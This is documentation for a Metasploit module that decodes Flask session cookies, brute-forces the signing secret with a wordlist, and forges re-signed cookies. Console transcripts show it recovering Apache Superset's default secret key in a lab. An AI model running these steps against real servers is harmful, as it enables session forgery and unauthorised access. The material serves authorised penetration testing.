## Vulnerable Application

This is a generic module which can manipulate Python Flask-based application cookies.
The Retrieve action will connect to a web server, grab the cookie, and decode it.
The Resign action will do the same as above, but after decoding it, it will replace
the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This
cookie can then be used in a browser. This is a Ruby based implementation of some
of the features in the Python project Flask-Unsign.

### Example Application

Apache Superset can be used since it is based on Flask.

```
sudo docker run -p 8088:8088 --name superset apache/superset:2.0.0
sudo docker exec -it superset superset fab create-admin \
              --username admin \
              --firstname Superset \
              --lastname Admin \
              --email admin@superset.com \
              --password admin
sudo docker exec -it superset superset db upgrade
sudo docker exec -it superset superset init
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/python_flask_cookie_signer`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should get a decoded cookie

## Actions

### Retrieve

Retrieve a cookie from an HTTP(s) server

### FindSecret

Using the provided wordlist, find the secret key used to sign the cookie

### Resign

Resign the specified cookie data

## Options

### TARGETURI

The URI which gives a cookie. Redirects are NOT followed.

### NEWCOOKIECONTENT

When action is set to `Resign`, the content of the decoded cookie will be replaced with this content.

### SECRET

When action is set to `Resign`, the cookie is signed with this secret.

### SECRET_KEYS_FILE

When action is set to `FindSecret`, a file containing secret keys to try. One per line. Defaults to `metasploit-framework/data/wordlists/flask_secret_keys.txt`

## Scenarios

### Apache Superset 2.0.0

#### Grab the cookie to make sure its a valid cookie that can be decoded. (Retrieve)

```
msf6 > use auxiliary/gather/python_flask_cookie_signer
msf6 auxiliary(gather/python_flask_cookie_signer) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 auxiliary(gather/python_flask_cookie_signer) > set RPORT 8088
RPORT => 8088
msf6 auxiliary(gather/python_flask_cookie_signer) > set TARGETURI /login
TARGETURI => /login
msf6 auxiliary(gather/python_flask_cookie_signer) > run
[*] Running module against 192.168.159.128

[*] 192.168.159.128:8088 - Retrieving Cookie
[*] 192.168.159.128:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZDU2N2U1ZDJmYmU1NDIyOTRlMzFhODU5YWFiMjQ5MTcwMDcyNTNhMyIsImxvY2FsZSI6ImVuIn0.ZPoc7Q.y_slNhIvS7PDX1gKMYpBS1nW0L0
[*] 192.168.159.128:8088 - Decoded Cookie: {"csrf_token"=>"d567e5d2fbe542294e31a859aab24917007253a3", "locale"=>"en"}
[*] Auxiliary module execution completed
```

#### Determine the secret key (FindSecret)

```
msf6 auxiliary(gather/python_flask_cookie_signer) > set action FindSecret
action => findsecret
msf6 auxiliary(gather/python_flask_cookie_signer) > run
[*] Running module against 127.0.0.1

[*] 127.0.0.1:8088 - Retrieving Cookie
[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZjNlMjU1MzBkZWNkYjE4YzRkYWMxMTQzODgyYjg1ODlmMWM3YzFjYyIsImxvY2FsZSI6ImVuIn0.ZP9b0w.PjZZJJ1lSiUQPacotJV0zbxX3fU
[+] 127.0.0.1:8088 - Found secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] Auxiliary module execution completed
```

#### Sign a new cookie (Resign)

```
msf6 auxiliary(gather/python_flask_cookie_signer) > set NEWCOOKIECONTENT '{"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}'
NEWCOOKIECONTENT => {"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}
msf6 auxiliary(gather/python_flask_cookie_signer) > set SECRET CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
SECRET => CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
msf6 auxiliary(gather/python_flask_cookie_signer) > set ACTION Resign
ACTION => Resign
msf6 auxiliary(gather/python_flask_cookie_signer) > run
[*] Running module against 192.168.159.128

[*] Attempting to sign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[+] 192.168.159.128:8088 - New signed cookie: session=IntcImNzcmZfdG9rZW5cIj0-XCIwOGU1MWRkMWYzNTJkNjc5MGU2YWI5Yjk5ZGFkZDYyMTYwMmI5MTg5XCIsIFwibG9jYWxlXCI9PlwiZnJcIn0i.ZPodFA.4hA6OiYpdxAUoOsA9L7DMTVOZkI
[*] Auxiliary module execution completed
msf6 auxiliary(gather/python_flask_cookie_signer) >
```
